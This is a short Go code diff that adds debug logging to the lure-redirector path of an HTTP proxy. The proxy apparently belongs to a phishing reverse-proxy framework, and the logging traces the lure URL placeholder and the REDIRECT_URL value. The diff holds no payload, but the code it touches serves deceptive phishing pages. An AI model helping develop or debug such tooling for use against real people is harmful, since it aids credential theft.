@@ -725,7 +725,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											html = p.injectOgHeaders(l, html)
 
 											body := string(html)
+											log.Debug("redirector: lure_url='%s' has_lure_url_html=%v", lure_url, strings.Contains(body, "{lure_url_html}"))
 											body = p.replaceHtmlParams(body, lure_url, &s.Params)
+											log.Debug("redirector: after replaceHtmlParams has_lure_url_html=%v", strings.Contains(body, "{lure_url_html}"))
+
+											// extract the REDIRECT_URL value for debugging
+											rIdx := strings.Index(body, "var REDIRECT_URL = ")
+											if rIdx >= 0 {
+												rEnd := strings.Index(body[rIdx:], ";")
+												if rEnd > 0 && rEnd < 200 {
+													log.Debug("redirector: %s", body[rIdx:rIdx+rEnd])
+												}
+											}
 
 											log.Info("lure: serving redirector '%s' (html length: %d)", l.Redirector, len(body))
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
